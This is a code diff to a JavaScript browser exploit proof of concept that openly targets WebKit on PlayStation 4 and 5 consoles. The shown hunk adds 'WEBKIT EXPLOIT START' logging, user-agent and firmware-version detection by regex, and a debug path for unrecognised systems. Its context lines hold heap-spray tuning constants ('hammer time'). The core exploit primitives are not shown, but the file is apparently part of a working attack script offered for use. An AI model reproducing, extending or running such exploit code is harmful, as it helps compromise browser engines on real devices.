@@ -10,17 +10,30 @@ var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
+    log("WEBKIT EXPLOIT START");
+
     // Compatibility Check
     const ua = navigator.userAgent;
+    log("User Agent: " + ua);
+
     const isPS4 = ua.includes("PlayStation 4");
     const isPS5 = ua.includes("PlayStation 5");
 
-    if (!isPS4 && !isPS5) {
-        const msg = "System not supported. This exploit is for PlayStation 4/5 only.";
-        if (window.log) log(msg);
-        alert(msg);
-        return;
+    if (isPS4) log("Detected System: PlayStation 4");
+    else if (isPS5) log("Detected System: PlayStation 5");
+    else {
+        log("[WARNING] System not recognized as PlayStation. Exploit will likely fail or crash.");
+        debug("Running in debug mode (PC/Other).");
     }
+
+    try {
+        const config = { target: null }; // Local quick check
+        const pattern = /^Mozilla\/5\.0 \(?(?:PlayStation; )?PlayStation (4|5)[ \/]([0-9]{1,2}\.[0-9]{2})\)? AppleWebKit\/[0-9.]+ \(KHTML, like Gecko\)(?: Version\/[0-9.]+ Safari\/[0-9.]+)?$/;
+        const match = pattern.exec(ua);
+        if (match) {
+            log("Detected Firmware: " + match[2]);
+        }
+    } catch (e) { }
 
     addEventListener('error', event => {
         const reason = event.error;
